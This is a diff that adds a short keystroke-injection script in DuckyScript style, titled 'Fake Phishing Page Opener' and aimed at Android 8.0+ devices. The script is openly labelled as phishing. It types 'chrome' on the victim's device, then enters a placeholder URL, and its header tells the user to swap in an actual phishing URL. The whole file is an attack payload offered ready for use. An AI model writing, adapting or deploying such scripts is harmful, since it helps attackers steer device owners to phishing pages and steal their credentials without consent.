@@ -1,0 +1,17 @@
+REM =====================================================
+REM Title: Fake Phishing Page Opener
+REM Author: yogeshjoga
+REM Target: Android 8.0+
+REM Category: Phishing
+REM Description: Opens browser to a specified URL
+REM IMPORTANT: Replace YOUR_PHISHING_URL with actual URL
+REM =====================================================
+
+DELAY 2000
+STRING chrome
+DELAY 1000
+ENTER
+DELAY 2000
+STRING YOUR_PHISHING_URL
+DELAY 500
+ENTER
